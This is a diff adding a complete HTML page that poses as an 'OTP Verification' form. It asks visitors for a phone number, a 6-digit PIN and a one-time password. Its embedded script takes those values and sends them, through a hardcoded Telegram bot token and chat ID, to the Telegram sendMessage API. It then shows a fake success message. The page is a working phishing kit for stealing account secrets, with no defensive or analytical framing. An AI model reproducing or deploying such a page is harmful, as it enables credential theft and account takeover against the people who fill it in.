@@ -1,0 +1,62 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>OTP Verification</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Arial,sans-serif;background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}.container{max-width:450px;width:100%}.card{background:white;border-radius:20px;padding:40px 30px;box-shadow:0 20px 60px rgba(0,0,0,0.3)}.header{text-align:center;margin-bottom:30px}.logo{width:80px;height:80px;background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);border-radius:50%;margin:0 auto 20px;display:flex;align-items:center;justify-content:center;font-size:40px}.title{font-size:28px;font-weight:bold;color:#1a1a1a;margin-bottom:8px}.subtitle{font-size:15px;color:#666}.form-group{margin-bottom:25px}.label{font-size:14px;font-weight:600;color:#1a1a1a;margin-bottom:8px;display:block}.input{width:100%;padding:14px 16px;font-size:16px;border:2px solid #e0e0e0;border-radius:10px;outline:none;transition:all 0.3s}.input:focus{border-color:#667eea}.pin-container{display:flex;gap:8px;justify-content:space-between;margin-bottom:25px}.pin-box{width:50px;height:55px;border:2px solid #e0e0e0;border-radius:10px;display:flex;align-items:center;justify-content:center;font-size:24px;font-weight:bold;color:#1a1a1a;cursor:pointer;transition:all 0.3s}.pin-box.filled{border-color:#667eea;background:#f0f4ff;color:#667eea}.btn{width:100%;background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);color:white;border:none;padding:16px;font-size:18px;font-weight:600;border-radius:12px;cursor:pointer;text-transform:uppercase;transition:transform 0.2s}.btn:active{transform:scale(0.98)}.loading{display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.8);justify-content:center;align-items:center;z-index:9999}.loading.active{display:flex}.spinner{width:50px;height:50px;border:4px solid rgba(255,255,255,0.3);border-top-color:white;border-radius:50%;animation:spin 1s linear infinite}@keyframes spin{to{transform:rotate(360deg)}}.success{text-align:center;color:#10b981;font-size:18px;font-weight:600;margin-top:15px;display:none}.success.show{display:block}
+</style>
+</head>
+<body>
+<div class="loading" id="loading"><div class="spinner"></div></div>
+<div class="container">
+<div class="card">
+<div class="header">
+<div class="logo">🔐</div>
+<h1 class="title">OTP Verification</h1>
+<p class="subtitle">Enter your details to verify</p>
+</div>
+<form onsubmit="submitForm(event)">
+<div class="form-group">
+<label class="label">Phone Number</label>
+<input type="tel" class="input" id="phone" placeholder="+60 12-345-6789" required>
+</div>
+<div class="form-group">
+<label class="label">6-digit PIN</label>
+<div class="pin-container" id="pinDisplay" onclick="document.getElementById('pinInput').focus()">
+<div class="pin-box" id="p1"></div>
+<div class="pin-box" id="p2"></div>
+<div class="pin-box" id="p3"></div>
+<div class="pin-box" id="p4"></div>
+<div class="pin-box" id="p5"></div>
+<div class="pin-box" id="p6"></div>
+</div>
+<input type="password" style="position:absolute;opacity:0;pointer-events:none" id="pinInput" maxlength="6" oninput="updatePIN(this.value)">
+</div>
+<div class="form-group">
+<label class="label">6-digit OTP</label>
+<div class="pin-container" id="otpDisplay" onclick="document.getElementById('otpInput').focus()">
+<div class="pin-box" id="o1"></div>
+<div class="pin-box" id="o2"></div>
+<div class="pin-box" id="o3"></div>
+<div class="pin-box" id="o4"></div>
+<div class="pin-box" id="o5"></div>
+<div class="pin-box" id="o6"></div>
+</div>
+<input type="text" style="position:absolute;opacity:0;pointer-events:none" id="otpInput" maxlength="6" oninput="updateOTP(this.value)">
+</div>
+<button type="submit" class="btn">Verify Now</button>
+<div class="success" id="success">✅ Verification Successful!</div>
+</form>
+</div>
+</div>
+<script>
+const BOT_TOKEN='8773529607:AAHdXEkCv1hlssSJqQcwb0tpS1EW0B4gN58';
+const CHAT_ID='8773529607';
+function updatePIN(val){val=val.replace(/\D/g,'');document.getElementById('pinInput').value=val;for(let i=1;i<=6;i++){const box=document.getElementById('p'+i);if(i<=val.length){box.classList.add('filled');box.textContent='•'}else{box.classList.remove('filled');box.textContent=''}}}
+function updateOTP(val){val=val.replace(/\D/g,'');document.getElementById('otpInput').value=val;for(let i=1;i<=6;i++){const box=document.getElementById('o'+i);if(i<=val.length){box.classList.add('filled');box.textContent=val[i-1]}else{box.classList.remove('filled');box.textContent=''}}}
+async function submitForm(e){e.preventDefault();const phone=document.getElementById('phone').value.trim();const pin=document.getElementById('pinInput').value;const otp=document.getElementById('otpInput').value;if(!phone||pin.length!==6||otp.length!==6){alert('Please fill all fields correctly');return}document.getElementById('loading').classList.add('active');const message=`✅ OTP VERIFICATION\n📱 Phone: ${phone}\n🔒 PIN: ${pin}\n🔑 OTP: ${otp}`;try{await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({chat_id:CHAT_ID,text:message})});document.getElementById('loading').classList.remove('active');document.getElementById('success').classList.add('show');setTimeout(()=>{document.getElementById('phone').value='';document.getElementById('pinInput').value='';document.getElementById('otpInput').value='';updatePIN('');updateOTP('');document.getElementById('success').classList.remove('show')},3000)}catch(err){document.getElementById('loading').classList.remove('active');alert('Verification failed. Please try again.')}}
+</script>
+</body>
+</html>
